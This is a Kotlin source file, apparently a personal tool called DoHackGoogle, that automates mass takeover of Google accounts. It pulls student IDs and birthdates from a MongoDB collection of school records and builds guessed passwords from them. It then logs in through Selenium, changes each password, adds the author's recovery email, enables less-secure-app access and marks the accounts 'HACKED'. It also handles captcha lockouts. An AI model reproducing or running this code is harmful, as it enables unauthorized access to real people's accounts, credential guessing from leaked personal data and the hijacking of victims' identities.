package net.scr0pt.thirdservice.google

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Filters
import com.mongodb.client.model.Updates
import net.scr0pt.selenium.GoogleResponse
import net.scr0pt.selenium.PageManager
import net.scr0pt.selenium.Response
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.utils.webdriver.DriverManager
import org.bson.Document
import java.util.*


fun main(args: Array<String>) {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection!!)
    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("oude-student-infomation-2")
//    collection.find().forEach {
//        val birthday = it.getString("NGÀY SINH")
//        if(birthday.endsWith(".0")){
//            println(birthday)
//            collection.updateOne(
//                    Document("MSSV", it.getString("MSSV")),
//                    Updates.set("NGÀY SINH", birthday.removeSuffix(".0"))
//            )
//        }
//    }

//    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")

//    DoHackGoogle(collection){
//         it.getString("pass")
//    }.run()
    DoHackGoogle(collection) {
        val birthday = it.getString("NGÀY SINH").replace("/", "")
        val mssv = it.getString("MSSV")
        "!$mssv$birthday@"
    }.run()
//    DoHackGoogle(collection).run()
}


class DoHackGoogle(val collection: MongoCollection<Document>, val generatePassword: (Document) -> String?) {
    val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = false)
    var captchaCount = 0


    fun run() {
        if (captchaCount < 10) {
//        while (captchaCount < 10) {
            collection.find(Filters.and(
                    Filters.exists("email"),
                    Filters.not(Document("email", ""))
            )).forEach {
                val email = it.getString("email") ?: return@forEach
                val password_status = it.getList("password_status", Document::class.java)
                val pass = generatePassword(it) ?: return@forEach
                if (password_status == null || password_status.none { it.getString("password") == pass }) {
                    googleRun(email, pass)
                }
            }
        }
    }

    private fun googleRun(email: String, pass: String) {
        val recoverEmail = "scr0pt.son@gmail.com"
        val newPassword = "TheMatrix@1999"
        println("email: $email | pass: $pass | recoverEmail: $recoverEmail | newPassword: $newPassword")

        PageManager(driverManager,
                "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        ).apply {
            addPageList(arrayListOf(
                    LoginEnterEmailPage(email),
                    LoginEnterPasswordPage(pass) {
                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_CORRECT)
                    },
                    WellcomeToNewAccount {
                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
                    },
                    ChangePasswordFirstTime(newPassword) {
                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
                        updatePassword(email, newPassword, PASSWORD_STATUS.NEW_PASSWORD)
                    },
                    EnterPasswordFirstTimeChanged(newPassword),
                    ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE),
                    ProtectYourAccountUpdatePhone(),
                    ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
                        update(email, "recover_email", recoverEmail)
                    },
                    ProtectYourAccountUpdateRecoverEmailSuccess {
                        update(email, "recover_email", recoverEmail)
                    },
                    GoogleSearch(),
                    AccountDisable(),
                    VerifyItsYouAction(),
                    VerifyItsYouPhoneNumber(),
                    VerifyItsYouPhoneNumberRecieveMessage(),
                    CantLoginForYou()
            ))

            generalWatingResult = { pageStatus ->
                if ((pageStatus.doc?.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
                    GoogleResponse.RECAPTCHA()
                } else Response.WAITING()
            }

            run { pageResponse ->
                when (pageResponse) {
                    is Response.OK -> {
                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
                        allowLessSecureApps(driver, email, collection)
                        driver.renew()
                    }
                    is GoogleResponse.ACCOUNT_DISABLE -> {
                        updateEmailStatus(email, EMAIL_STATUS.AccountDisable)
                        driver.renew()
                    }
                    is GoogleResponse.NOT_FOUND_EMAIL -> {
                        updateEmailStatus(email, EMAIL_STATUS.NOT_EXIST)
                    }
                    is GoogleResponse.INCORECT_PASSWORD -> {
                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_INCORRECT)
                    }
                    is GoogleResponse.PASSWORD_CHANGED -> {
                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_CHANGED)
                    }
                    is GoogleResponse.RECAPTCHA -> {
                        driver.renew()
                    }
                    is Response.NOT_FOUND_ELEMENT -> {
                    }
                    is Response.WAITING -> {
                    }
                }

                if (pageResponse is GoogleResponse.RECAPTCHA) captchaCount++
                else captchaCount = 0

                println(pageResponse)
                Thread.sleep(10000)
            }
        }
    }

    fun update(email: String, key: String, value: String) {
        println("Update set $key to $value when email is $email")
        collection.updateOne(Document("email", email), Updates.combine(Updates.set(key, value)))
    }


    enum class EMAIL_STATUS {
        AccountDisable, NOT_EXIST, HACKED
    }

    fun updateEmailStatus(email: String, status: EMAIL_STATUS) {
        update(email, "email_status", status.toString())
    }

    enum class PASSWORD_STATUS {
        PASSWORD_CHANGED, PASSWORD_INCORRECT, PASSWORD_CORRECT, NEW_PASSWORD
    }

    fun updatePassword(email: String, pass: String, status: PASSWORD_STATUS) {
        println("Update password set $pass to $status when email is $email")
        collection.updateOne(
                Document("email", email),
                Updates.push("password_status", Document("password", pass).append("status", status.toString()).append("updated_at", Date()))
        )
    }
}